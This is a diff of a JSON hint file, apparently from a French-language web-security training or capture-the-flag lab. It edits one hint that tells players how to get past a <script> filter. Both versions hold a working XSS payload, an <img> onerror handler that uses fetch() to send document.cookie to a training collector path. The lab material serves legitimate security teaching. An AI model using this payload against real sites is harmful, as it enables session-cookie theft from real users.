@@ -1,7 +1,7 @@
 [
   {
-    "title": "Bypass de filtre basique",
+    "title": "Échappement de balise",
     "cost": 10,
-    "content": "Si <script> est filtré, tente un vecteur d'événement comme <img src=\"invalid\" onerror=\"fetch('/targets/training/web-04/collector?c='+document.cookie)\">."
+    "content": "Si <script> est filtré, essaie <img src=x onerror=\"fetch('/targets/training/web-04/collector?c='+document.cookie)\">."
   }
 ]
